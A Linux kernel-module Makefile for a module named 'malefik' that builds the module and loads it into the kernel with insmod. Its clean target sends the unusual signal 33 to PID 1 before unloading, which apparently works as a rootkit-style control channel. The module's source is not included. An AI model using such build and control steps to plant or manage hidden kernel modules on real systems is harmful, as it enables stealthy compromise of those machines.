obj-m 		:= malefik.o
KERNEL_ROOT := /lib/modules/$(shell uname -r)/build

modules:
	@$(MAKE) -C $(KERNEL_ROOT) M=$(shell pwd) modules
	insmod malefik.ko

debug:
	sed -i 's/DEBUG 0/DEBUG 1/g' malefik.c
	@$(MAKE) -C $(KERNEL_ROOT) M=$(shell pwd) modules
	insmod malefik.ko 

clean:
	kill -33 1
	rmmod malefik
	@$(MAKE) -C $(KERNEL_ROOT) M=$(shell pwd) clean
